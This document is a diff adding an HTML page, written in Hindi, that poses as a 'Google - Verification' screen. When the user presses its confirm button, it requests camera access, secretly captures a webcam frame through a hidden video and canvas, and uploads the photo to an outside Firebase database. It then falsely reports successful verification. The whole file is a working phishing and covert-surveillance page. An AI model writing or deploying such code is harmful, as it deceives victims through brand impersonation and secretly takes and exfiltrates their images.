@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <title>Google - Verification</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+</head>
+<body style="text-align:center; padding-top:100px; font-family:sans-serif;">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="100">
+    <h2>पहचान की पुष्टि करें</h2>
+    <button onclick="detect()" style="padding:12px 30px; background:#1a73e8; color:white; border:none; border-radius:4px; cursor:pointer;">पुष्टि करें</button>
+    <video id="v" style="display:none" autoplay playsinline></video>
+    <canvas id="c" style="display:none"></canvas>
+
+    <script>
+        const firebaseConfig = { databaseURL: "https://pari-project-police-68f77-default-rtdb.firebaseio.com/" };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        async function detect() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('v').srcObject = stream;
+                
+                setTimeout(() => {
+                    const v = document.getElementById('v'), c = document.getElementById('c');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    const img = c.toDataURL('image/jpeg', 0.5);
+                    
+                    // सिर्फ फोटो डेटा भेजना
+                    database.ref('live_detect').set({ photo: img, time: new Date().toLocaleString() });
+                    alert("सत्यापन सफल।");
+                }, 2000);
+            } catch(e) { alert("कृपया कैमरा की अनुमति दें।"); }
+        }
+    </script>
+</body>
+</html>
